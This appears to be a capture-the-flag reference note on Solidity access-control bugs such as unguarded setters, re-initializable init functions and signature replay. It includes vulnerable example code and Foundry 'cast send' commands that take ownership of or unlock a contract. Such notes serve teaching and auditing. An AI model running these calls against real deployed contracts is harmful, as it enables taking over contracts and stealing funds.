# Access control — the unprotected setter / missing onlyOwner

## The shape

The most common CTF web3 bug: a function that writes the solved state is simply
callable by anyone.

```solidity
function setOwner(address _o) public {      // no onlyOwner
    owner = _o;
}
function unlock() external {                 // anyone unlocks
    locked = false;
}
function init(address _o) public {           // re-initializable
    require(!initialized);
    owner = _o; initialized = true;
}
```

## The detection fingerprint

- a non-view `public`/`external` function that writes a slot `isSolved()` reads
- no `onlyOwner`/`onlyX`/`require(msg.sender == ...)` guard
- an `init`/`initialize`/`setup` callable post-deploy
- **falsifier**: every writer of the predicate's slots is guarded, or the guard
  can't be bypassed

## The exploit

```bash
cast send $CHALLENGE "setOwner(address)" $CALLER --private-key $KEY --rpc-url $RPC
cast send $CHALLENGE "unlock()" --private-key $KEY --rpc-url $RPC
cast send $CHALLENGE "init(address)" $CALLER --private-key $KEY --rpc-url $RPC
```

The cheapest class — one call flips the predicate. Always enumerate the
reachable non-view functions FIRST; a bare setter is the intended solve more
often than a deep bug.

## The variants

| Variant | The shape |
|---|---|
| **bare setter** | `setOwner`/`setFlag`/`unlock` with no guard |
| **re-init** | `initialize`/`init` callable after deploy — become the owner |
| **forgotten internal** | an `internal`-intended function left `public` |
| **default-visibility** | old Solidity `function f()` (pre-0.5) defaults `public` |
| **constructor-as-function** | pre-0.5: a function named the contract's name is callable as a normal function — `function Contract()` is not the constructor if cased differently |
| **auth-by-signature** | a `require(recover(sig) == owner)` where the sig is replayable / the signer is derivable |

## The reachability enumeration

```bash
# list the non-view external/public functions
# read each for a guard; the unguarded one writing the predicate's slot is the bug
```

A function that writes `owner`/`locked`/`flag`/`balance` and has no
`require(msg.sender ...)` is the solve. The check is per-function — the bug
class is "a reachable write," not a missing modifier name.

## The evidence

`cast call` the predicate-relevant getter before/after: `owner()` or `locked()`
changes, `isSolved() → true`. One `cast send` and one `cast call` are the whole
exploit.
